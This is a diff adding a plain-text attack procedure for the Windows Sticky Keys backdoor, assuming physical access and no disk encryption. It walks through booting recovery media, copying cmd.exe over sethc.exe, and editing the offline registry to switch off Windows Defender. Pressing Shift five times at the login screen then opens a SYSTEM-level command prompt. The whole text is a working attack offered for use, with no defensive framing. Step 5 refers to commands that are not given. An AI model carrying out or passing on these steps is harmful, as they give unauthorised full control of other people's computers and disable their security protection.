@@ -1,0 +1,51 @@
+	Assumptions & Caveats:
+-	Assuming physical access to the target machine
+-	Assuming no BIOS power-on password or Full-Disk Encryption
+-	Assuming Windows OS is installed on C:
+- Assuming Sticky Keys is enabled (Windows default)
+- Caveat: There is little difference between this method and side-loading a Lixux OS or using the Windows Recovery/Installation media to directly interact with the Windows OS files with SYSTEM level permissions
+	- Advantages:
+		- Windows Recovery/Installation boot media looks innocuous.
+		- Provides SYSTEM level permissions in an interactive OS environment
+			- Allows you to create/modify accounts
+			- Allows you to execute code in OS
+	
+	Preparation:
+1.	Download Microsoft Recovery/Installation media and flash to bootable USB drive.
+	https://support.microsoft.com/en-us/windows/create-installation-media-for-windows-99a58364-8c02-206f-aa6f-40c3b507420d
+
+	Execution (on the target machine):
+2.	Boot to Microsft Recovery/Installation USB drive (ensure that media matches the Operating System)
+
+3.	Select "Troubleshoot"
+
+4.	Select "Command Prompt"
+
+5.	Detrmine the Drive letter of the Window Operating System (default is C:)
+	If Windows OS is not installed on C:, check each letter sequentially using the following commands until you see "<DIR> Windows", that is where the OS is installed:
+		
+6.	Execute the following commands:
+		copy c:\windows\system32\sethc.exe c:\windows\system32\sethc-old.exe
+		copy c:\windows\system32\cmd.exe C:\windows\system32\sethc.exe
+		yes
+		regedit
+		
+7.	In the Registry Editor:
+	- Select "HKEY_LOCAL_MACHINE"
+	- Open the "File" menue
+	- Select "Load Hive"
+	- Navigate to c:\windows\system32\config
+	- Select "Software"
+	- Navigate to "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender
+	- If you don't see the DisableAntiSpyware value on the right pane of the Registry Editor's window, right-click the Windows Defender key, select New and click on DWORD (32-bit) Value
+	- Name the newly created value DisableAntiSpyware and press Enter
+	- Double-click DisableAntiSpyware and set its value to 1
+		- Click OK and restart the computer
+		
+8.	When Windows boots, press any key/s to invoke the log-in screen (you want to be looking at the Username/Password fields).
+
+9.	Press the "shift" key 5 times in a row in rapid succession.
+
+10. Enjoy SYSTEM level terminal access!
+
+		
